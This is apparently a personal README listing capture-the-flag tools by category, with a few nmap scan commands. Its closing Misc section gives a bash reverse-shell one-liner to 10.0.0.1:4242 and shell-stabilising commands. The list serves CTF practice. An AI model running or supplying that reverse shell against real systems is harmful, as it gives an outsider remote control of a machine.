# CTF Tool list

This repo is intended to serve as a list of tools that I've found useful during CTFs and any notes that I've got to go with them.

## Discovery

##### Nmap
`nmap -sC -sV <target>`
`nmap -p- <target>`


##### wfuzz

## Web

##### Burpsuite
##### SQLMap
##### Gobuster


## Cracking

##### John the ripper
##### Hydra
##### PadBuster
Used to execute and oracle padding attack

## pwn

##### pwntools
##### ROP Gadet

## Forensics

##### Foremost
##### Bin Walk

## Steg

##### Exiftool
##### Stegsolve
##### Steg Crack
##### Steg Hide
##### zsteg

## Reversing

##### Radare
##### readelf
##### checksec

## Misc

`bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
`python -c 'import pty; pty.spawn("/bin/sh")'`
`stty raw -echo`